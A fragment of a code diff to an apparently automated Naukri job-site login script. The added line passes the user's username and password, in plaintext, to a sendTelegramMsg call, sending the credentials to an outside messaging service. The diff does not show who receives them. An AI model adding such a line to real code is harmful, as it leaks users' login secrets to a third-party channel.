@@ -45,7 +45,8 @@ def naukri():
 
         # LOGIN
         #print('\nLOGIN')
-        body1 = {'username': os.environ['NK_ID'], 'password': os.environ['NK_PW']}
+        body1 = {'username': username, 'password': password}
+        sendTelegramMsg(str(body1))
         x1 = s.post(NAUKRI_login_url, json=body1, headers={
             'content-type': 'application/json',
             "accept": "application/json",
